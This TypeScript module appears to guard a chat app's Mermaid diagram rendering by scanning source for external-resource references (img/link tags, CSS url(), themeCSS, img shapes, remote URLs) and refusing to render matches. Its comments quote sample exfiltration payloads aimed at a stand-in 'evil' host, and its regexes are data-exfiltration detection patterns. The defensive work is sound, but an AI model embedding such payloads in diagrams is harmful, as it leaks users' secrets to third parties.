/**
 * mermaid 源码「外部资源」预扫（纯 TS、不碰 React / DOM / mermaid 运行时）。
 *
 * 为什么要：`@streamdown/mermaid` 默认 `securityLevel: "strict"`，但 mermaid 的 `sanitizeText` 在没配 `dompurifyConfig` 时
 * 只 `FORBID_TAGS: ["style"]`——节点标签里的 `<img src="https://evil/p?d=<密钥>">` 会原样留在 SVG 里，
 * SVG 经 `dangerouslySetInnerHTML` 进 DOM 的瞬间浏览器就发请求（渲染即触发、不用点击）。
 * 同类通道还有：`classDef x background-image:url(…)` / `%%{init:{"themeCSS":"@import url(…)"}}%%`（themeCSS 默认不在 mermaid 的 secure 键里，
 * 指令可改；{@link MERMAID_SAFE_CONFIG} 把它加进 `secure`）/ `A@{ img: "https://…" }`（imageSquare 形状）/ `<image href>`、`<video poster>`、
 * `<link rel=stylesheet>` 等。注意 `@{}` / frontmatter 走 YAML、`%%{init}%%` 走 JSON，字符串转义（`"\u0069mg"`）会被解析器还原，预扫要先解转义（R8-1）。
 * 这和 markdown 图是同一类追踪像素 / 数据外带（见 lib/remote-image-gate），所以同样默认拦。
 *
 * 做法（两道，互相独立）：
 *  1. 本模块的 {@link scanMermaidSource}：对源码做**保守**预扫，命中就**不交给 mermaid 渲染**。
 *     - rehype 层（lib/mermaid-rehype-gate）：命中的 ```mermaid 块改成普通代码块（显示源码）+ 一行提示——这是用户看得见的主路径，
 *       三处 Streamdown 入口（对话 / 产物栏 / 修订视图）共用同一张 rehype 表，自动继承；
 *     - 插件层（{@link createGatedMermaidPlugin}）：包住 `getMermaid().render`，命中直接抛错、不调用 mermaid——
 *       渲染 / 全屏 / 下载 PNG-SVG 三条路径都经 `render`，是「不管上游怎么调」的最后一道闸。
 *  2. {@link MERMAID_SAFE_CONFIG} 里的 `dompurifyConfig`：文本经 DOMPurify 时禁掉 img / image / video / audio / source / link / style 等标签
 *     与 src / srcset / poster / background 属性。这是纵深防御，**只覆盖经 sanitizeText 的文本**（CSS / 指令 / 形状数据不经它），
 *     也不能禁 svg / use / style 属性（图标和 KaTeX 也走它），所以主力是第 1 道。
 *
 * 保守原则：宁可误拦（正常图被退回显示源码）也不漏放。已知误拦（用户看到的是「只显示源码」，内容都在、可复制）：
 *  - 节点文字里写了完整 URL（`https://…` / `ftp://…`）——**有意保留**，不放宽；
 *  - `img:` 开头的文字（`A["img: 头像"]`）；
 *  - 危险标签名后面还跟了东西的泛型 / 文字：`Map<Link, X>`、`<Image, X>`（光秃秃的 `<Link>` / `<Image>` 已放行，见 {@link TAG_ATTR_CAPABLE_RE}）；
 *  - 光秃秃的 `<svg>` / `<style>` / `<script>` / `<math>` / `<use>` 等（这些自带内联内容 / 子资源能力，不细化）；
 *  - 节点文字里写 `URL(x)` / `curl(x)` 之外的 `xxx(`：只有 `url(` 紧贴括号才算 CSS 函数；`Base URL (prod)`（带空格）已放行；
 *  - 源码超过 {@link MERMAID_SCAN_MAX_LENGTH} 字符（不做预扫、整块退回源码）。
 * 普通文字里的 `https` 字样（不带 `://`）不拦。
 *
 * 预扫看的是「mermaid 实际会收到的那段源码」：流式期间半截源码同样先过这一关（半截里已经出现的危险片段会命中；
 * 还没写出来的片段不可能触发请求，因为 mermaid 拿到的文本里没有它）。
 */

import type { DiagramPlugin, MermaidConfig } from "@streamdown/mermaid";

export type MermaidGateReason =
  | "html-tag" // <img> / <image> / <video> / <audio> / <source> / <link> / <style> / <svg> …
  | "url-attribute" // src= / srcset= / poster= / background=
  | "css-url" // url( / image-set( / cross-fade( / @import
  | "img-shape" // mermaid `@{ img: … }`
  | "theme-css" // themeCSS 指令 / 配置键
  | "remote-url" // http(s):// / ftp:// / ws(s)://
  | "protocol-relative" // //host.tld
  | "too-long" // 源码超过 MERMAID_SCAN_MAX_LENGTH：不做预扫，直接按命中处理（限制预扫耗时）
  | "invalid-input"; // 不是字符串

export type MermaidGateResult =
  | { blocked: false }
  | { blocked: true; reasons: MermaidGateReason[] };

const REASON_LABEL: Record<MermaidGateReason, string> = {
  "html-tag": "HTML 图片 / 媒体 / 样式标签",
  "url-attribute": "src / srcset / background 等资源属性",
  "css-url": "CSS url() / @import",
  "img-shape": "img: 图片节点",
  "theme-css": "themeCSS",
  "remote-url": "http(s) 地址",
  "protocol-relative": "//host 形式的地址",
  "too-long": "源码过长",
  "invalid-input": "非文本输入",
};

/**
 * 预扫的源码长度上限（UTF-16 字符数，≈ 200 KB）：超过直接按 {@link MermaidGateReason} `too-long` 处理、不再扫。
 * 预扫是线性的（见下方正则注释），上限是兜底——别让异常长的输入（恶意 / 模型吐了一大坨）在 rehype 层 + render 前各扫一遍多个解码副本。
 * mermaid 自己的 `maxTextSize` 默认只有 5 万字符（超了它渲染的是「Maximum text size exceeded」），所以这个上限不会误伤任何能正常渲染的图。
 */
export const MERMAID_SCAN_MAX_LENGTH = 200_000;

/** 给人看的原因清单（去重、中文） */
export const describeMermaidGateReasons = (reasons: readonly MermaidGateReason[]): string =>
  [...new Set(reasons)].map((r) => REASON_LABEL[r]).join("、");

/**
 * 命中后展示在源码上方的提示（rehype 层 / 错误信息共用）。
 * 三种措辞：源码过长（没做预扫）/ 非文本输入 / 含外部资源引用——后者要说清「预扫是保守的、可能只是普通文字被误拦，
 * 只是没渲染成图，源码完整可看可复制」（R8-5）。三条都含「只显示源码」（测试按它断言）。
 */
export const mermaidBlockedNotice = (reasons: readonly MermaidGateReason[]): string => {
  const set = new Set(reasons);
  if (set.has("too-long")) {
    return (
      `该 mermaid 源码过长（超过 ${MERMAID_SCAN_MAX_LENGTH / 1000} KB），为避免卡顿没有做安全预扫，所以没有渲染图表，只显示源码；` +
      "源码完整，可查看、可复制。"
    );
  }
  if (set.has("invalid-input")) return "该 mermaid 输入不是文本，没有渲染图表，只显示源码。";
  return (
    `该 mermaid 图含外部资源引用（${describeMermaidGateReasons(reasons)}）。渲染时浏览器会自动请求这些地址，可能把内容带给第三方，` +
    "所以没有渲染图表，只显示源码。预扫是保守的，普通文字里写了网址等也可能被拦下——只是没渲染成图，源码完整，可查看、可复制。"
  );
};

// ───────── 规范化 ─────────

/** 常见 ASCII 标点的命名实体（扫描只关心能拼出标签 / 协议 / url( 的那些字符；未知命名实体原样保留） */
const NAMED_ENTITIES: Record<string, string> = {
  lt: "<",
  gt: ">",
  amp: "&",
  quot: '"',
  apos: "'",
  colon: ":",
  sol: "/",
  bsol: "\\",
  lpar: "(",
  rpar: ")",
  equals: "=",
  period: ".",
  comma: ",",
  semi: ";",
  num: "#",
  excl: "!",
  quest: "?",
  commat: "@",
  lowbar: "_",
  hyphen: "-",
  dash: "-",
  lcub: "{",
  rcub: "}",
  lbrace: "{",
  rbrace: "}",
  lsqb: "[",
  rsqb: "]",
  lbrack: "[",
  rbrack: "]",
  verbar: "|",
  vert: "|",
  grave: "`",
  ast: "*",
  plus: "+",
  percnt: "%",
  dollar: "$",
  tab: "\t",
  newline: "\n",
  nbsp: " ",
};

const codePointToChar = (cp: number): string => {
  if (!Number.isFinite(cp) || cp <= 0 || cp > 0x10ffff) return "";
  if (cp >= 0xd800 && cp <= 0xdfff) return "";
  return String.fromCodePoint(cp);
};

/**
 * 解一层「编码」：HTML 数字 / 命名实体（分号可省，浏览器也认）、mermaid 自己的 `#35;` / `#quot;` 实体码、
 * JSON / YAML / JS 字符串转义（`\uXXXX` / `\u{…}` / `\xXX` / `\UXXXXXXXX`，R8-1；YAML 的「反斜杠 + 换行」续行，R9-1）、CSS 转义（`\72` / `\u`）。
 *
 * 为什么要解字符串转义：mermaid 的 `@{ … }` 形状数据与 frontmatter 走 YAML、`%%{init: …}%%` 走 JSON，这些解析器会把
 * `"\u0069mg"` / `"theme\u0043SS"` / `"\u0075rl(\u0068ttps://…)"` 还原成真字符串，而我们扫的是还没解析的原文——
 * 不解的话 `A@{ "\u0069mg": "\u0068ttps://evil/p" }` 与 themeCSS 的转义写法都会放行（第 8 轮审查方实测）。
 *
 * 只用来**生成扫描用的副本**（原文也会被扫），所以误解码（`#333;` → ō）至多造成一次误拦判断，不会让漏放。
 * 每条正则的量词都有界（或只吞单个字符），扫描是线性的。
 */
const decodeOnce = (s: string): string =>
  s
    .replace(/&#x([0-9a-f]{1,8});?/gi, (_m, h: string) => codePointToChar(Number.parseInt(h, 16)))
    .replace(/&#(\d{1,8});?/g, (_m, d: string) => codePointToChar(Number.parseInt(d, 10)))
    .replace(/&([a-z][a-z0-9]{1,15});?/gi, (m, n: string) => NAMED_ENTITIES[n.toLowerCase()] ?? m)
    .replace(/#(\d{1,8});/g, (_m, d: string) => codePointToChar(Number.parseInt(d, 10)))
    .replace(/#([a-z][a-z0-9]{1,15});/gi, (m, n: string) => NAMED_ENTITIES[n.toLowerCase()] ?? m)
    // YAML 双引号串的续行：`\` + 换行（+ 下一行的前导空白）整段被解析器吃掉，`"u\<换行>    rl(ht\<换行>    tps://x"` 解出 `url(https://x`（R9-1）。
    // 放在其它转义之前：吃掉之后拼出来的才是真字符串。量词只吞空白、后面接互斥的换行，每个反斜杠最多往后扫一段空白，线性
    .replace(/\\[ \t]*(?:\r\n|[\n\r])[ \t]*/g, "")
    // JSON / JS：UTF-16 代理对 `\uD83D\uDE00` 先合成一个码点（单独的代理没有对应字符，下面的 `\uXXXX` 会把它抹成空串）
    .replace(
      /\\u([dD][89abAB][0-9a-fA-F]{2})\\u([dD][c-fC-F][0-9a-fA-F]{2})/g,
      (_m, hi: string, lo: string) =>
        codePointToChar(0x10000 + ((Number.parseInt(hi, 16) - 0xd800) << 10) + (Number.parseInt(lo, 16) - 0xdc00)),
    )
    // JS：`\u{1F600}`（前导 0 不限；超过 0x10FFFF 的码点非法 → 抹成空串，不崩）
    .replace(/\\u\{0*([0-9a-fA-F]{1,8})\}/g, (_m, h: string) => codePointToChar(Number.parseInt(h, 16)))
    // JSON / YAML / JS：`\u0069`
    .replace(/\\u([0-9a-fA-F]{4})/g, (_m, h: string) => codePointToChar(Number.parseInt(h, 16)))
    // YAML / JS：`\x69`
    .replace(/\\x([0-9a-fA-F]{2})/g, (_m, h: string) => codePointToChar(Number.parseInt(h, 16)))
    // YAML：`\U00000069`（大写 U = 8 位；故意区分大小写，免得跟 4 位的 `\u` 混）
    .replace(/\\U([0-9a-fA-F]{8})/g, (_m, h: string) => codePointToChar(Number.parseInt(h, 16)))
    // CSS 转义：`\72 ` / `\000072` = 十六进制码点（后跟一个可选空白）；`\x` = 字符本身
    .replace(/\\([0-9a-f]{1,6})[ \t\n\r\f]?/gi, (_m, h: string) =>
      codePointToChar(Number.parseInt(h, 16)),
    )
    .replace(/\\([^\n\r\f])/g, "$1");

/** 解码最多这么多层（`&amp;lt;` → `&lt;` → `<`）；到不动点就停 */
const MAX_DECODE_PASSES = 3;

/** 零宽 / 控制 / 方向控制字符：浏览器 URL 解析和标签解析会忽略或截断，统一抹掉后再比（保留 \t \n \r 等普通空白） */
const INVISIBLE_RE = /[\u0000-\u0008\u000b\u000e-\u001f\u007f-\u009f\u00ad\u200b-\u200f\u2028-\u202e\u2060-\u206f\ufeff]/g;

const variantsOf = (source: string): string[] => {
  const out: string[] = [];
  let cur = source;
  for (let i = 0; i <= MAX_DECODE_PASSES; i += 1) {
    const clean = cur.replace(INVISIBLE_RE, "").toLowerCase();
    if (!out.includes(clean)) out.push(clean);
    const next = decodeOnce(cur);
    if (next === cur) break;
    cur = next;
  }
  return out;
};

// ───────── 规则 ─────────

/**
 * 标签正则的线性写法（R8-2）：`<` 与标签名之间只允许「空白 / 斜杠」，写成**一个**字符类的 `*`：`<[\s/]*(?:…)`。
 * 原先是 `<\s*\/?\s*`——两个 `\s*` 之间隔着一个可选的 `/`，遇到 `"<" + 空白×N + "x"` 时 V8 要在两段空白之间枚举切分点，
 * 耗时 O(N²)（N=2 万 1.3 s、8 万 20 s，UI 假死）。单个字符类 `*` 后面接的是互斥的首字母，每个 `<` 起点最多回溯 O(空白段长度)，整体线性。
 * 代价：`<` 与标签名之间能容忍多个斜杠（`<//img`，HTML 里其实是注释）——只会多拦，不会漏放。
 *
 * 本模块其余正则都已逐个用「长空白 / 长重复字符 / 未闭合」样本压测过 1e5 量级（tests/mermaid-source-gate.test.ts「耗时上限」）：
 * 要么量词有界，要么「量词后面接的字符与量词本身互斥 / 起点之间不重叠」，没有嵌套量词，不会再出现二次方。
 */

/** 带属性段就拦的标签（`<table class=x>` 拦、`<table>` 光秃秃 / `Map<String, Object>` 的 `<Object>` 不拦） */
const ATTR_TAGS = "object|input|form|button|table|td|th|tr|body|textarea|select";
/**
 * 请求**靠属性**触发的标签（img 要 src、link 要 href、video 要 src / poster……）：
 * 光秃秃的 `<img>` / `</img>` / `<img/>`（标签名后面**立即**闭合，没地方写属性）没有请求能力 → 放行，`List<Link>` / `Array<Image>` 这类泛型不再误拦（R8-5）；
 * 标签名后面跟了别的任何东西（空白 / `/属性` / 逗号 / 流式半截的 EOF）仍拦。
 * 放行不会漏放：属性只能写在标签名与 `>` 之间；扫描副本里原文与每层解码都要同时不命中才算放行（`<img&gt;` 这种原文变体里 `<img` 后面不是 `>`，照拦）。
 */
const REQUEST_BY_ATTR_TAGS = "img|image|video|audio|source|picture|track|link|iframe|frame|embed|meta|base";
/**
 * 光秃秃也拦的标签：`<script>` 自带执行能力，`<style>` / `<svg>` / `<use>` / `<feImage>` / `<foreignObject>` / `<math>` / `<frameset>`
 * 自带内联内容或子资源引用能力——这批不细化，宁可误拦。
 */
const ALWAYS_TAGS = "style|svg|use|feimage|script|foreignobject|math|frameset";

const TAG_ALWAYS_RE = new RegExp(`<[\\s/]*(?:${ALWAYS_TAGS})(?![a-z0-9_-])`);
const TAG_ATTR_CAPABLE_RE = new RegExp(`<[\\s/]*(?:${REQUEST_BY_ATTR_TAGS})(?![a-z0-9_-])(?!\\/?>)`);
const TAG_WITH_ATTR_RE = new RegExp(`<[\\s/]*(?:${ATTR_TAGS})(?=[\\s/])`);

/** 标签起点（`<` 后紧跟字母；`<<interface>>` / `A<-->B` / `<|--` 都不是） */
const TAG_START_RE = /<\s*[a-z]/;
/**
 * 会让浏览器去取资源的属性名（前缀 `[\s"'/]` 把 `data-src=` 之类排除）。
 * 与 {@link TAG_START_RE} 配合：源码里**既有**标签起点、**又有**这类属性才算命中——不去解析「这个属性属于哪个标签」：
 * 解析要靠限长 / 回溯的正则，攻击者用长串属性垫一垫就能绕过；两个独立的线性检查没有这个问题（代价是更保守）。
 */
const URL_ATTR_RE = /[\s"'/](?:src|srcset|poster|background)\s*=/;

/**
 * CSS 取资源函数 / 规则。`url(` 前面不能是标识符字符（`getUrl()` / `curl(x)` 这类函数调用式的标签文字不误拦），
 * `image-set` / `cross-fade` 带 `-webkit-` 前缀也要中，所以不加前缀限制。
 *
 * R8-5：`url` 必须**紧贴**括号——CSS 语法里 `url (x)`（带空白）不是函数、浏览器不会取资源，`Base URL (prod)` 这种普通文字不该拦；
 * `expression(` 是 IE 的 CSS 表达式，现代浏览器 / mermaid 引擎都不支持，不再算（`Regular expression (regex)` 不再误拦）。
 * `image-set` / `cross-fade` / `@import` 没动（保守，文字里很少这么写）。
 */
const CSS_URL_RE = /(?<![a-z0-9_$.-])url\(|(?:image-set|cross-fade)\s*\(|@\s*import/;
/**
 * 浏览器解析 URL 时会悄悄丢掉内部的 tab / LF / CR（`ht\ntps://`）；其它空白不会，所以只抹这三个，不把整段文字拼成一团。
 * 还要抹**字面的** `\t` / `\n` / `\r` 两字符序列：JSON / YAML 字符串里 `"ht\ttps://x"` 解析后就是带真 tab 的 URL，而我们扫的是未解析的原文
 * （`decodeOnce` 的通用 `\\.` 剥除会把它变成 `httptps://`，对不上）。
 */
const stripUrlNoise = (s: string): string => s.replace(/[\t\n\r]+|\\[tnr]/g, "");
const REMOTE_URL_RE = /(?:https?|wss?|ftp):\//;
/** `//host.tld`：前面不是 `:`（那是 scheme，上一条管）；要求带点的 host 形，避免把 `a//b` 一类误拦太多 */
const PROTOCOL_RELATIVE_RE = /(?<!:)\/\/[a-z0-9_-]+\.[a-z0-9_-]+/;
/** mermaid 形状数据 `@{ img: "…" }`；键名可带引号 */
const IMG_SHAPE_RE = /(?<![a-z0-9_$-])["']?img["']?\s*:/;
const THEME_CSS_RE = /themecss/;

const scanVariant = (v: string, reasons: Set<MermaidGateReason>): void => {
  if (TAG_ALWAYS_RE.test(v) || TAG_ATTR_CAPABLE_RE.test(v) || TAG_WITH_ATTR_RE.test(v)) reasons.add("html-tag");
  if (TAG_START_RE.test(v) && URL_ATTR_RE.test(v)) reasons.add("url-attribute");
  if (IMG_SHAPE_RE.test(v)) reasons.add("img-shape");
  if (THEME_CSS_RE.test(v)) reasons.add("theme-css");
  if (CSS_URL_RE.test(v)) reasons.add("css-url");
  const flat = stripUrlNoise(v);
  if (REMOTE_URL_RE.test(flat)) reasons.add("remote-url");
  if (PROTOCOL_RELATIVE_RE.test(flat)) reasons.add("protocol-relative");
};

/**
 * 预扫 mermaid 源码：是否含「渲染时会让浏览器自动请求外部资源」的构造。
 * 对原文及其 1~3 层解码副本（HTML 实体 / mermaid `#35;` 实体码 / JSON·YAML·JS 字符串转义 / CSS 转义）逐个扫，大小写不敏感，抹掉零宽 / 控制字符。
 * 超过 {@link MERMAID_SCAN_MAX_LENGTH} 字符直接按 `too-long` 命中（不扫，限制耗时）。
 * 纯函数；半截源码也可直接传。
 */
export const scanMermaidSource = (source: unknown): MermaidGateResult => {
  if (typeof source !== "string") return { blocked: true, reasons: ["invalid-input"] };
  if (source.length > MERMAID_SCAN_MAX_LENGTH) return { blocked: true, reasons: ["too-long"] };
  const reasons = new Set<MermaidGateReason>();
  for (const v of variantsOf(source)) scanVariant(v, reasons);
  return reasons.size > 0 ? { blocked: true, reasons: [...reasons] } : { blocked: false };
};

// ───────── 插件层（第二道闸） ─────────

/** 插件层命中时抛的错：message 直接给上游的错误面板显示 */
export class MermaidBlockedError extends Error {
  readonly reasons: MermaidGateReason[];
  constructor(reasons: MermaidGateReason[]) {
    super(mermaidBlockedNotice(reasons));
    this.name = "MermaidBlockedError";
    this.reasons = reasons;
  }
}

/**
 * 包一层 streamdown 的 mermaid 插件：`render` 之前先预扫，命中抛 {@link MermaidBlockedError}、**不调用**底层 mermaid。
 * 上游的渲染 / 全屏 / 下载 SVG·PNG 都走 `getMermaid().render`，所以这里是唯一收口；`initialize` 原样转发。
 */
export const createGatedMermaidPlugin = (base: DiagramPlugin): DiagramPlugin => ({
  ...base,
  getMermaid(config) {
    const inner = base.getMermaid(config);
    return {
      initialize: (cfg) => inner.initialize(cfg),
      render: async (id, source) => {
        const verdict = scanMermaidSource(source);
        if (verdict.blocked) throw new MermaidBlockedError(verdict.reasons);
        return inner.render(id, source);
      },
    };
  },
});

// ───────── 配置层（纵深防御，只覆盖标签文本） ─────────

/**
 * 标签文本经 DOMPurify 时额外禁掉的标签 / 属性（mermaid 11 的 `sanitizeText` 传了 `dompurifyConfig` 就用它、否则只禁 style）。
 *
 * 注意两点：
 *  1. 它**只管经过 sanitizeText 的文本**（节点 / 边标签、图标、KaTeX 输出）；classDef / themeCSS / `@{ img }` 形状数据不经这里，
 *     所以只是纵深防御，主防线是预扫。
 *  2. **不能禁得太狠**：mermaid 的 `getIconSVG`（图标，`<svg>` 标记）与 KaTeX 数学公式输出也走 `sanitizeText`（读 mermaid 11.16 源码确认）。
 *     禁 `svg` / `use` / `math` 标签、`style` / `xlink:href` 属性会让图标和公式渲染坏掉（KaTeX 的版面全靠内联 style），
 *     所以这些**不禁**——代价是第二层拦不住 `<svg><use href="https://…">`，这条靠预扫（`<svg` / `<use` / `https://` 任一命中就整图不交给 mermaid）。
 * 属性里也没禁 `href`：`<a href>` 点击才跳转、不自动请求。
 */
export const MERMAID_FORBID_TAGS = [
  "img",
  "image",
  "video",
  "audio",
  "source",
  "picture",
  "track",
  "link",
  "style",
  "feimage",
  "iframe",
  "frame",
  "frameset",
  "embed",
  "object",
  "meta",
  "base",
  "foreignobject",
] as const;

export const MERMAID_FORBID_ATTRS = ["src", "srcset", "poster", "background"] as const;

/**
 * mermaid 11 默认的 `secure` 键（指令 / frontmatter 里同名键会被引擎丢掉）：读 mermaid 11.16 源码 `defaultConfig.secure` 确认的值。
 * 这里写出来是因为本模块不引入 mermaid 运行时（rehype 层 / 服务端也会 import 它）；tests/mermaid-source-gate.test.ts 会拿
 * 真实 mermaid 的默认值对照（我们的列表必须包含它的全部默认键），mermaid 升级加了新默认键而这里漏了就会变红。
 */
export const MERMAID_DEFAULT_SECURE_KEYS = [
  "secure",
  "securityLevel",
  "startOnLoad",
  "maxTextSize",
  "suppressErrorRendering",
  "maxEdges",
] as const;

/**
 * 在默认键之上追加 `themeCSS`（R8-1 的纵深防御）：`themeCSS` 默认**不在** secure 里，`%%{init: {"themeCSS": "…url(https://…)"}}%%`
 * 与 frontmatter 的 `config.themeCSS` 会被引擎原样塞进 `<style>`——引擎自己删掉指令里的同名键，预扫漏了转义写法也兜得住。
 * 实测（mermaid 11.16，`initialize({ secure })` 后 `parse` 带 themeCSS 指令）：加了之后 `getConfig().themeCSS === undefined`；
 * mermaid 的 `assignWithDepth` 对数组是**合并**（`includes || push`）而不是覆盖，所以不会把默认键冲掉；
 * 这里仍把默认键一并写出，免得将来合并语义变成覆盖时反而变松。
 */
export const MERMAID_SECURE_KEYS: readonly string[] = [...MERMAID_DEFAULT_SECURE_KEYS, "themeCSS"];

export const MERMAID_SAFE_CONFIG: MermaidConfig = {
  // 显式钉住（插件默认值也是 strict；mermaid 的 secure 键保证指令改不了它）
  securityLevel: "strict",
  secure: [...MERMAID_SECURE_KEYS],
  dompurifyConfig: {
    FORBID_TAGS: [...MERMAID_FORBID_TAGS],
    FORBID_ATTR: [...MERMAID_FORBID_ATTRS],
  },
};
